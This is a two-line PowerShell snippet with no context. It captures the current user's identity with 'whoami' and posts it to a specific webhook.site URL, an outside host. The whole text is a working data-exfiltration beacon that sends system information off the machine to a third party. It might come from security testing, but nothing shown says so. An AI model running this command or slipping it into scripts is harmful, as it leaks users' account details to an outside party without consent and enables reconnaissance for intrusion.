$info = whoami
Invoke-RestMethod -Uri "https://webhook.site/7422bad4-b2c7-4886-9f4d-518c904adc29" -Method Post -Body $info
